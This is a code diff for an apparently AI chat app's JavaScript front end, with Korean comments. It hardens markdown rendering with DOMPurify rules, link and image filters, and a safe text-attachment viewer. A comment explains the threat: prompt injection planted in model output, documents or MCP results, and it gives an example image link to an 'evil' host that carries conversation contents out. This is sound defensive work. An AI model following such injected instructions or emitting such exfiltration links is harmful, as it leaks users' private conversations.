@@ -88,6 +88,12 @@ function h(tag, attrs = {}, ...children) {
   return node;
 }
 
+/* 데이터(플러그인 정보·서버 응답)에서 온 주소를 링크로 쓸 때: 절대 http(s) 주소만, 아니면 null(h()가 href를 빼 준다). */
+function safeHref(url) {
+  const text = String(url || "").trim();
+  return /^https?:\/\/[^\s/]/i.test(text) ? text : null;
+}
+
 function toast(text) {
   const t = $("#toast");
   t.textContent = text;
@@ -169,15 +175,73 @@ function fixKoreanBold(text) {
     i % 2 ? part : part.replace(/\*\*(?=\S)([^*\n]*?\S)\*\*/g, "<strong>$1</strong>")).join("");
 }
 
+/* 모델 출력·문서·MCP 결과에 심은 지시(프롬프트 인젝션)가 화면을 통해 자료를 밖으로 보내지 못하게 한다.
+   - 이미지는 data:image·blob:만 그린다. ![](https://evil/?d=대화내용)은 그리는 순간 요청이 나가므로 주소를 지운다.
+   - 링크는 절대 https?:·mailto:만 남긴다. //host/x는 file:// 화면 기준으로 UNC(SMB) 경로가 되므로 지운다.
+   - 그 밖의 주소 속성(srcset·poster·background·action 등)과 url(...)이 든 style도 지운다.
+   KaTeX가 만든 style(높이·여백)과 내부 svg는 그대로 둔다. */
+const MD_PURIFY = {
+  FORBID_TAGS: ["style", "link", "meta", "base", "form", "input", "button", "textarea", "select",
+    "video", "audio", "source", "track", "picture", "object", "embed", "iframe", "frame", "image", "use", "foreignObject"],
+  FORBID_ATTR: ["srcset", "poster", "background", "action", "formaction", "ping", "lowsrc", "dynsrc", "data"],
+};
+const MD_LINK_OK = /^(https?:\/\/|mailto:)/i;
+const MD_IMG_OK = /^(data:image\/(png|jpe?g|gif|webp);|blob:)/i;
+// CSS 이스케이프(\75 rl( = url()·주석·@규칙으로 검사를 피하지 못하게 백슬래시·/*·@가 든 style은 통째로 지운다
+const MD_STYLE_BAD = /url\s*\(|image-set|image\s*\(|@|expression\s*\(|\\|\/\*/i;
+// SVG 속성(fill·mask·clip-path·filter·marker-*)의 url(...)도 외부 주소를 부른다. 문서 안 참조(url(#id))만 남긴다
+const MD_ATTR_URL = /url\s*\(\s*(?!['"]?#)/i;
+if (window.DOMPurify) {
+  DOMPurify.addHook("afterSanitizeAttributes", (node) => {
+    if (!renderMarkdown.active) return;
+    if (node.hasAttribute("href") || node.hasAttribute("xlink:href")) {
+      const href = (node.getAttribute("href") || node.getAttribute("xlink:href") || "").trim();
+      const isLink = node.tagName === "A";
+      if (!(isLink ? MD_LINK_OK.test(href) : href.startsWith("#"))) {
+        node.removeAttribute("href");
+        node.removeAttribute("xlink:href");
+      }
+    }
+    if (node.hasAttribute("src")) {
+      const src = (node.getAttribute("src") || "").trim();
+      if (!(node.tagName === "IMG" && MD_IMG_OK.test(src))) {
+        node.removeAttribute("src");
+        node.setAttribute("data-blocked-src", src.slice(0, 300));
+      }
+    }
+    if (node.hasAttribute("style") && MD_STYLE_BAD.test(node.getAttribute("style"))) node.removeAttribute("style");
+    for (const attr of Array.from(node.attributes || [])) {
+      if (attr.name !== "style" && (MD_ATTR_URL.test(attr.value) || attr.value.includes("\\"))) node.removeAttribute(attr.name);
+    }
+  });
+}
+
 function renderMarkdown(text) {
   const box = h("div", { class: "md" });
-  if (!window.marked) {
+  if (!window.marked || !window.DOMPurify) {
     box.style.whiteSpace = "pre-wrap";
     box.textContent = text || "";
     return box;
   }
-  box.innerHTML = DOMPurify.sanitize(marked.parse(fixKoreanBold(text || "")));
-  box.querySelectorAll("a").forEach((a) => a.setAttribute("target", "_blank"));
+  renderMarkdown.active = true;
+  try {
+    box.innerHTML = DOMPurify.sanitize(marked.parse(fixKoreanBold(text || "")), MD_PURIFY);
+  } finally {
+    renderMarkdown.active = false;
+  }
+  // 막힌 외부 이미지는 그리지 않고 대체 글과 주소를 글자로만 보여 준다(누르거나 불러오지 않는다)
+  box.querySelectorAll("img[data-blocked-src]").forEach((img) => {
+    const src = img.getAttribute("data-blocked-src");
+    const alt = img.getAttribute("alt") || "이미지";
+    img.replaceWith(h("span", { class: "md-blocked-img", title: "외부 이미지는 불러오지 않습니다" },
+      `[${alt}]`, src ? ` (${src})` : ""));
+  });
+  box.querySelectorAll("a").forEach((a) => {
+    if (a.hasAttribute("href")) {
+      a.setAttribute("target", "_blank");
+      a.setAttribute("rel", "noopener noreferrer");
+    }
+  });
   box.querySelectorAll("pre").forEach((pre) => {
     const code = pre.querySelector("code");
     const lang = ((code && code.className.match(/language-(\S+)/)) || [])[1] || "code";
@@ -458,7 +522,7 @@ function attachmentList(items) {
   return h("div", { class: "msg-files" }, items.map((a) => {
     if (a.kind === "image") {
       const img = h("img", { alt: a.name });
-      const node = h("button", { class: "file-img", title: a.name, onclick: () => api().open_attachment(a.id) }, img);
+      const node = h("button", { class: "file-img", title: a.name, onclick: () => openAttachment(a) }, img);
       const show = (url) => (url ? (img.src = url) : node.replaceWith(fileChip(a)));
       if (previewCache.has(a.id)) show(previewCache.get(a.id));
       else api().attachment_preview(a.id).then((url) => { previewCache.set(a.id, url); show(url); });
@@ -468,8 +532,17 @@ function attachmentList(items) {
   }));
 }
 
+/* 이미지·문서는 기본 앱으로 연다. 텍스트 첨부는 실행되지 않도록 Python이 내용만 돌려주고 여기서 보여 준다. */
+function openAttachment(a) {
+  api().open_attachment(a.id).then((r) => {
+    if (!r || typeof r.text !== "string") return;
+    modal({ title: r.name || a.name, wide: true,
+      body: h("pre", { class: "attach-text" }, r.text + (r.truncated ? "\n\n… (앞부분만 표시했습니다)" : "")) });
+  });
+}
+
 function fileChip(a) {
-  return h("button", { class: "file-chip", title: a.name, onclick: () => api().open_attachment(a.id) },
+  return h("button", { class: "file-chip", title: a.name, onclick: () => openAttachment(a) },
     h("span", { class: "f-icon", html: ICONS.file }),
     h("span", { class: "f-text" }, h("span", { class: "f-name" }, a.name), h("small", {}, fmtSize(a.size))));
 }
